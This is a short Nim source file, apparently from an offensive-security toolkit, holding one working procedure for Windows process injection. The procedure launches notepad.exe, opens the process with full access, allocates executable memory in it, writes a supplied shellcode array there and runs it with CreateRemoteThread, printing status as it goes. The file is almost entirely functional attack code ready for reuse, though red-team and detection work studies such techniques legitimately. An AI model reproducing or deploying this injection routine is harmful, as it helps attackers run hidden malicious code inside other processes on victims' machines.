
#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
]#
import winim/lean
import osproc


proc injectCreateRemoteThread*[I, T](shellcode: array[I, T]): void =

    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"